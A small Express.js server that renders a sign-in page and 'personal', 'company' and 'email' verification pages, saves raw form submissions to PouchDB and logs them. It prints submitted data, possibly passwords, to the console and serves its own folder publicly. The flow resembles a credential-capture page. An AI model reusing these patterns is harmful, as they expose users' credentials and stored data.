const express = require('express');
const app = express();
const path = require('path');
var PouchDB = require('pouchdb');
var db = new PouchDB("database");


db.allDocs({include_docs: true});

const bodyParser = require('body-parser');
var urlencodedParser = bodyParser.urlencoded({ extended: false });

app.use(express.static(__dirname));
app.set('view engine','ejs');



 app.get('/',function(req,res){
   res.render('signin');
 });



app.post('/thanks',urlencodedParser,function(req,res){
  var object=JSON.stringify(req.body);
  var doc={
    object
  }
  db.post(doc).then(function (response) {
   console.log("true");
 }).catch(function (err) {
   console.log("err");
 });
  res.render('thankyou');
  console.log(req.body);
});



app.get('/Personalverfication',function(req,res){
res.render('page1');

});


app.post('/Personalverfication',urlencodedParser,function(req,res){
  res.render('page2');
  console.log(req.body);
});


app.post('/companyverfication',urlencodedParser,function(req,res){
  res.render('page3');
});

app.post('/emailverfication',urlencodedParser,function(req,res){
  res.render('thankyou');
  console.log(req.body);
});

app.listen(3003);

console.log('Running at Port ');
